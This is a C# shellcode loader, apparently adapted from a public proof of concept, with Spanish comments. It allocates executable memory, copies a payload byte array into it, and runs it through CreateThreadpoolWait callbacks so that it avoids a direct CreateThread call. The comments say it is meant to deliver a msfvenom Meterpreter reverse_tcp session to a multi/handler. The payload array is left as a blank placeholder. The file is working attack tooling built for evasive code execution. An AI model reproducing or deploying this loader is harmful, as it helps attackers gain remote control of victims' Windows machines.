using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;


// Original POC by https://github.com/S4R1N/AlternativeShellcodeExec/tree/master/CreateThreadPoolWait
//En este ejemplo utilizamos CreateThreadPool para ejecutar nuestro shellcode de forma indirecta sin usar CreateThread directamente.
//Establece una sesión de Meterpreter, en principio el payload está pensado para usarlo conjuntamente con el multi/handler, por lo que el 
//payload generado con msfvenom deberá tener /meterpreter/reverse_tcp 



namespace CreateThreadPoolWaitAPI
{
    class Program
    {

        [Flags]
        public enum AllocationType
        {
            Commit = 0x00001000,
            Reserve = 0x00002000,
            Decommit = 0x00004000,
            Release = 0x00008000,
            Reset = 0x00080000,
            TopDown = 0x00100000,
            WriteWatch = 0x00200000,
            Physical = 0x00400000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            NoAccess = 0x0001,
            ReadOnly = 0x0002,
            ReadWrite = 0x0004,
            WriteCopy = 0x0008,
            Execute = 0x0010,
            ExecuteRead = 0x0020,
            ExecuteReadWrite = 0x0040,
            ExecuteWriteCopy = 0x0080,
            GuardModifierflag = 0x0100,
            NoCacheModifierflag = 0x0200,
            WriteCombineModifierflag = 0x0400
        }

        [DllImport("kernelbase.dll")]
        public static extern bool CloseHandle(IntPtr hObject);
        [DllImport("ntdll.dll")]
        private static extern bool RtlMoveMemory(IntPtr addr, byte[] pay, uint size);
        //[DllImport("kernel32.dll")]
        //public static extern IntPtr LoadLibraryW([MarshalAs(UnmanagedType.LPWStr)]string lpFileName);
        [DllImport("kernelbase.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThreadpoolWait(IntPtr pfnwa, uint pv, uint pcb);
        [DllImport("kernel32.dll")]
        private static extern void SetThreadpoolWait(IntPtr pwa, IntPtr h, IntPtr pftTimeout);
        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateEventA(IntPtr lpEventAttributes, bool bManualReset, bool bInitialState, bool lpName);       
        [DllImport("kernel32.dll")]
        private static extern bool SetEvent(IntPtr hndle);
        [DllImport("kernel32.dll")]
        private static extern uint WaitForSingleObject(  IntPtr hHandle,  uint dwMilliseconds);



        static void Main(string[] args)
        {   
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("ShellCode Execution via CreateThreadPoolWait (March 2021)");
            Console.WriteLine();
            //string[] X = args[0].Split(',');
            //byte[] payld = new byte[X.Length];
            //for (int i = 0; i < X.Length;) { payld[i] = Convert.ToByte(X[i], 16); i++; }
            byte[] payld = new byte[_______];
            Console.WriteLine();
            IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)payld.Length, AllocationType.Commit, MemoryProtection.ExecuteReadWrite);
            IntPtr evt = CreateEventA(IntPtr.Zero, false, true, false);
            RtlMoveMemory(p, payld, (uint)payld.Length); //Similar to Marshal.Copy(payload, 0, address, payload.Length);
            Console.WriteLine("[!] [" + DateTime.Now.ToString() + "]::VirtualAlloc.Result[" + p.ToString("X8") + "]");
            IntPtr result = CreateThreadpoolWait(p, 0, 0);
            Console.WriteLine("[!] [" + DateTime.Now.ToString() + "]::CreateThreadpoolWait.Result[" + result.ToString("X8") + "]");
            Console.WriteLine();
            System.Threading.Thread.Sleep(5555);
            SetThreadpoolWait(result, evt, IntPtr.Zero);
            SetEvent(evt);
            Console.WriteLine("Established Meterpreter Session via callback functions Technique by \"CreateThreadPoolWait\"  ;)");
            WaitForSingleObject(evt, 0);
            Console.ReadKey();
        }
    }
}